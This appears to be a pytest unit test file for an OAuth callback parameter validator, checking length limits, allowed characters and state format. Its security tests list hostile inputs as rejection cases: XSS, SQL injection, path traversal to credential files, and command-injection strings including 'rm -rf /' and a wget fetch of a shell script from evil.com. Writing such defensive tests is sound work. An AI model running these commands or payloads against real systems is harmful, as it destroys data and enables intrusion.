"""Unit tests for OAuthCallbackValidator service."""

from unittest.mock import Mock

import pytest

from requirements_bot.api.error_responses import OAuthError, ValidationError
from requirements_bot.core.services.oauth_callback_validator import OAuthCallbackValidator


class TestOAuthCallbackValidator:
    """Test OAuth callback parameter validation."""

    def test_validator_initialization(self):
        """Test validator initialization with correct limits."""
        validator = OAuthCallbackValidator()

        assert validator.max_code_length == 512
        assert validator.max_state_length == 128
        assert validator.max_error_length == 256

    def test_validate_callback_params_success(self):
        """Test successful validation of valid callback parameters."""
        validator = OAuthCallbackValidator()
        request = Mock()
        request.query_params = {"code": "valid_auth_code_123", "state": "valid_state_param_12345"}

        result = validator.validate_callback_params(request, "google")

        assert result["code"] == "valid_auth_code_123"
        assert result["state"] == "valid_state_param_12345"

    def test_validate_callback_params_with_error(self):
        """Test validation when OAuth error is present."""
        validator = OAuthCallbackValidator()
        request = Mock()
        request.query_params = {"error": "access_denied"}

        with pytest.raises(OAuthError, match="OAuth error: access_denied"):
            validator.validate_callback_params(request, "google")

    def test_validate_code_param_success(self):
        """Test successful authorization code validation."""
        validator = OAuthCallbackValidator()

        valid_codes = [
            "simple_code_123",
            "code-with-hyphens",
            "code_with_underscores",
            "code.with.dots",
            "code/with/slashes",
        ]

        for code in valid_codes:
            result = validator._validate_code_param(code, "google")
            assert result == code.strip()

    def test_validate_code_param_missing(self):
        """Test validation of missing authorization code."""
        validator = OAuthCallbackValidator()

        with pytest.raises(ValidationError) as exc_info:
            validator._validate_code_param(None, "google")

        assert exc_info.value.args[0] == "Missing authorization code"
        assert exc_info.value.args[1] == "code"

    def test_validate_code_param_empty_string(self):
        """Test validation of empty authorization code."""
        validator = OAuthCallbackValidator()

        with pytest.raises(ValidationError) as exc_info:
            validator._validate_code_param("", "google")

        assert exc_info.value.args[0] == "Missing authorization code"

    def test_validate_code_param_too_long(self):
        """Test validation of oversized authorization code."""
        validator = OAuthCallbackValidator()
        long_code = "a" * 513  # One character over limit

        with pytest.raises(ValidationError) as exc_info:
            validator._validate_code_param(long_code, "google")

        assert exc_info.value.args[0] == "Authorization code too long"
        assert exc_info.value.args[1] == "code"

    def test_validate_code_param_unsafe_characters(self):
        """Test validation of code with unsafe characters."""
        validator = OAuthCallbackValidator()

        unsafe_codes = ["code<script>", "code'with'quotes", "code with spaces", "code&param=value", "code?query=string"]

        for unsafe_code in unsafe_codes:
            with pytest.raises(ValidationError) as exc_info:
                validator._validate_code_param(unsafe_code, "google")
            assert exc_info.value.args[0] == "Invalid authorization code format"

    def test_validate_state_param_success(self):
        """Test successful state parameter validation."""
        validator = OAuthCallbackValidator()

        valid_states = [
            "state_12345678901234567890",  # Minimum length + some
            "state-with-hyphens-123456",
            "state_with_underscores_123",
            "UPPERCASE_STATE_123456789",
        ]

        for state in valid_states:
            result = validator._validate_state_param(state, "google")
            assert result == state.strip()

    def test_validate_state_param_missing(self):
        """Test validation of missing state parameter."""
        validator = OAuthCallbackValidator()

        with pytest.raises(ValidationError) as exc_info:
            validator._validate_state_param(None, "google")

        assert exc_info.value.args[0] == "Missing state parameter"
        assert exc_info.value.args[1] == "state"

    def test_validate_state_param_too_short(self):
        """Test validation of too short state parameter."""
        validator = OAuthCallbackValidator()

        with pytest.raises(ValidationError) as exc_info:
            validator._validate_state_param("short", "google")

        assert exc_info.value.args[0] == "Invalid state parameter format"

    def test_validate_state_param_too_long(self):
        """Test validation of oversized state parameter."""
        validator = OAuthCallbackValidator()
        long_state = "a" * 129  # One character over limit

        with pytest.raises(ValidationError) as exc_info:
            validator._validate_state_param(long_state, "google")

        assert exc_info.value.args[0] == "State parameter too long"
        assert exc_info.value.args[1] == "state"

    def test_validate_state_param_invalid_format(self):
        """Test validation of state parameter with invalid characters."""
        validator = OAuthCallbackValidator()

        invalid_states = [
            "state.with.dots.1234567890",  # Dots not allowed in state
            "state with spaces 1234567890",  # Spaces not allowed
            "state@symbol#1234567890",  # Special chars not allowed
            "state/slash/1234567890",  # Slashes not allowed
        ]

        for invalid_state in invalid_states:
            with pytest.raises(ValidationError) as exc_info:
                validator._validate_state_param(invalid_state, "google")
            assert exc_info.value.args[0] == "Invalid state parameter format"

    def test_validate_error_param_success(self):
        """Test successful error parameter validation."""
        validator = OAuthCallbackValidator()

        valid_errors = ["access_denied", "invalid_request", "unauthorized_client"]

        for error in valid_errors:
            # Should not raise exception
            validator._validate_error_param(error, "google")

    def test_validate_error_param_too_long(self):
        """Test validation of oversized error parameter."""
        validator = OAuthCallbackValidator()
        long_error = "a" * 257  # One character over limit

        with pytest.raises(ValidationError) as exc_info:
            validator._validate_error_param(long_error, "google")

        assert exc_info.value.args[0] == "Error parameter too long"
        assert exc_info.value.args[1] == "error"

    def test_validate_error_param_unsafe_characters(self):
        """Test validation of error parameter with unsafe characters."""
        validator = OAuthCallbackValidator()

        unsafe_errors = [
            "error<script>alert('xss')</script>",
            "error'with'quotes",
            "error with spaces",
            "error&param=value",
        ]

        for unsafe_error in unsafe_errors:
            with pytest.raises(ValidationError) as exc_info:
                validator._validate_error_param(unsafe_error, "google")
            assert exc_info.value.args[0] == "Invalid error parameter format"

    def test_is_safe_param_valid_characters(self):
        """Test safe parameter character validation."""
        validator = OAuthCallbackValidator()

        valid_params = [
            "simple123",
            "param-with-hyphens",
            "param_with_underscores",
            "param.with.dots",
            "param/with/slashes",
            "UPPERCASE123",
            "mixedCASE123",
        ]

        for param in valid_params:
            assert validator._is_safe_param(param) is True

    def test_is_safe_param_invalid_characters(self):
        """Test safe parameter validation rejects unsafe characters."""
        validator = OAuthCallbackValidator()

        invalid_params = [
            "param with spaces",
            "param@with@symbols",
            "param#with#hash",
            "param?with?query",
            "param&with&ampersand",
            "param=with=equals",
            "param<with>brackets",
            "param'with'quotes",
            'param"with"double_quotes',
        ]

        for param in invalid_params:
            assert validator._is_safe_param(param) is False

    def test_is_valid_state_format_success(self):
        """Test valid state format validation."""
        validator = OAuthCallbackValidator()

        valid_states = [
            "state_1234",  # Minimum length (10 chars)
            "state_12345678901234567890",
            "state-with-hyphens-123456",
            "UPPERCASE_STATE_123456789",
            "a" * 128,  # Maximum length
        ]

        for state in valid_states:
            assert validator._is_valid_state_format(state) is True

    def test_is_valid_state_format_invalid(self):
        """Test state format validation rejects invalid formats."""
        validator = OAuthCallbackValidator()

        invalid_states = [
            "",  # Empty
            "short",  # Too short
            "a" * 129,  # Too long
            "state.with.dots.1234567890",  # Invalid chars
            "state with spaces 1234567890",  # Spaces
            "state@symbol#1234567890",  # Special chars
        ]

        for state in invalid_states:
            assert validator._is_valid_state_format(state) is False


class TestOAuthCallbackValidatorSecurity:
    """Test security-specific scenarios for OAuth callback validation."""

    def test_xss_attack_prevention(self):
        """Test prevention of XSS attacks in parameters."""
        validator = OAuthCallbackValidator()

        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "'\"><script>alert('xss')</script>",
        ]

        for payload in xss_payloads:
            with pytest.raises(ValidationError):
                validator._validate_code_param(payload, "google")

            with pytest.raises(ValidationError):
                validator._validate_state_param(payload + "1234567890", "google")

    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attacks in parameters."""
        validator = OAuthCallbackValidator()

        sql_payloads = ["'; DROP TABLE users; --", "' OR 1=1 --", "admin'/*", "' UNION SELECT password FROM users --"]

        for payload in sql_payloads:
            with pytest.raises(ValidationError):
                validator._validate_code_param(payload, "google")

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        validator = OAuthCallbackValidator()

        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "....//....//....//etc/passwd",
        ]

        for payload in traversal_payloads:
            with pytest.raises(ValidationError):
                validator._validate_code_param(payload, "google")

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        validator = OAuthCallbackValidator()

        command_payloads = ["; rm -rf /", "| cat /etc/passwd", "$(wget http://evil.com/shell.sh)", "`id`"]

        for payload in command_payloads:
            with pytest.raises(ValidationError):
                validator._validate_code_param(payload, "google")

    def test_parameter_length_limits_security(self):
        """Test that parameter length limits prevent DoS attacks."""
        validator = OAuthCallbackValidator()

        # Test with very large payloads that could cause DoS
        huge_code = "a" * 10000
        huge_state = "a" * 10000
        huge_error = "a" * 10000

        with pytest.raises(ValidationError, match="Authorization code too long"):
            validator._validate_code_param(huge_code, "google")

        with pytest.raises(ValidationError, match="State parameter too long"):
            validator._validate_state_param(huge_state, "google")

        with pytest.raises(ValidationError, match="Error parameter too long"):
            validator._validate_error_param(huge_error, "google")

    def test_whitespace_handling_security(self):
        """Test proper whitespace handling to prevent bypass attempts."""
        validator = OAuthCallbackValidator()

        # Test leading/trailing whitespace is stripped but inner whitespace rejected
        code_with_whitespace = "  valid_code_123  "
        result = validator._validate_code_param(code_with_whitespace, "google")
        assert result == "valid_code_123"

        # Inner whitespace should be rejected
        with pytest.raises(ValidationError):
            validator._validate_code_param("code with space", "google")

        # State parameter whitespace handling
        state_with_whitespace = "  valid_state_1234567890  "
        result = validator._validate_state_param(state_with_whitespace, "google")
        assert result == "valid_state_1234567890"

    def test_unicode_attack_prevention(self):
        """Test prevention of unicode-based attacks."""
        validator = OAuthCallbackValidator()

        unicode_payloads = [
            "code\u202e\u0041\u0041\u0041",  # Right-to-left override
            "code\ufeff",  # Byte order mark
            "code\u00a0",  # Non-breaking space
            "code\u2028",  # Line separator
        ]

        for payload in unicode_payloads:
            with pytest.raises(ValidationError):
                validator._validate_code_param(payload, "google")
